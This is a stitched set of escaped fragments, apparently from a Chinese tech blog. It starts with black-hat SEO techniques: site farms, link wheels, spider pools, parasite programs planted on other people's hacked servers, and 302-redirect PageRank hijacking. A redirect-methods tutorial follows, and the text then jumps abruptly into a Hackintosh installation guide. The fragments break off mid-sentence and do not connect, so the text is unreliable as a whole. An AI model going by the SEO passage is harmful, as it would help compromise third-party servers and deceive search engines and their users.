alt=\"\"><br>前提：在做域名解析的时候，选择了*<br>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。</p>\n<h5 id=\"泛端口站群\"><a href=\"#泛端口站群\" class=\"headerlink\" title=\"泛端口站群\"></a>泛端口站群</h5><p><img src=\"/upload_image/20161009/1.png\" alt=\"\"><br>操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</p>\n<h4 id=\"站中站\"><a href=\"#站中站\" class=\"headerlink\" title=\"站中站\"></a>站中站</h4><p>　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p>\n<h4 id=\"链轮\"><a href=\"#链轮\" class=\"headerlink\" title=\"链轮\"></a>链轮</h4><p><img src=\"/upload_image/20161009/3.png\" alt=\"\"><br>　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。</p>\n<h4 id=\"蜘蛛池\"><a href=\"#蜘蛛池\" class=\"headerlink\" title=\"蜘蛛池\"></a>蜘蛛池</h4><p>　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p>\n<h4 id=\"寄生虫\"><a href=\"#寄生虫\" class=\"headerlink\" title=\"寄生虫\"></a>寄生虫</h4><p>　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p>\n<p><hr></p>\n<h3 id=\"黑帽SEO作弊手法\"><a href=\"#黑帽SEO作弊手法\"

往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。<br>　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。</p>\n<h4 id=\"网站跳转\"><a href=\"#网站跳转\" class=\"headerlink\"

http层跳转\n　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。\n##### html head跳转（HTML refresh）\n在html代码的head中添加特殊标签，如下\n```bash\n<meta http-equiv=\"refresh\" content=\"5\"; url=\"http://thief.one/\" />\n```\n表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。\n\n##### js跳转\n通过在html代码中添加js代码，通过js代码实现跳转：\n```bash\n<script language=\"javascript\"

（二）http跳转\n介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。\n优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。\n缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。\n#### （三）html head跳转\n介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。\n优点：跳转方式灵活，可以指定延时跳转等等\n缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。\n#### （四）

更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）\n* 升级内容：内存加到8G，添加固态硬盘\n* 系统更换：黑化之苹果系统\n\n　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！\n\n### 更换升级零件\n　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。\n　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。\n　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。\n　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。\n\n### 安装黑苹果\n\n#### 准备阶段\n* 第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。\n* 第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。\n* 第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。\n\t所需软件：\n\t* 变色龙引导程序\n\t* 懒人版镜像\n\t* 硬盘助手\n\t* HFS\n\t* DiskGenius Pro 4.30\n\t* ......\n\n准备工作都弄好了，那么可以开始动手干了！\n\n##### 安装变色龙引导程序\n![](/upload_image/20170213/1.png)\n以管理员身份打开：\n![](/upload_image/20170213/2.png)\n　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。\n![](/upload_image/20170213/3.png)\n这3个文件是变色龙的引导文件。\n\n##### 安装HFS\n![](/upload_image/20170213/4.png)\n直接双击运行，一路安装，具体作用自行百度吧。\n\n##### 给电脑分区\n首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）\n然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）\n##### 打开硬盘助手\n![](/upload_image/20170213/5.png)\n将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。\n\n##### DiskGenius Pro 4.30（查看磁盘状态工具）\n![](/upload_image/20170213/6.png)\n将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。\n\n##### 将EFI文件放入安装盘根目录\n![](/upload_image/20170213/7.png)\n即放在那个8G大小的盘根目录。\n注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。\n\n##### EDID注入\nEFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。\n\n##### 将Clover.iso替换wowpc.iso\n将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。\n\n#### 安装阶段\n　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。\n\n#### 驱动配置\n　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。\n　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit

 <string>pci168c,24</string>\n                        </array>\n```\n代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存\n，重启。重启之后无线网卡应该能成功驱动了。\n　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。\n\n####
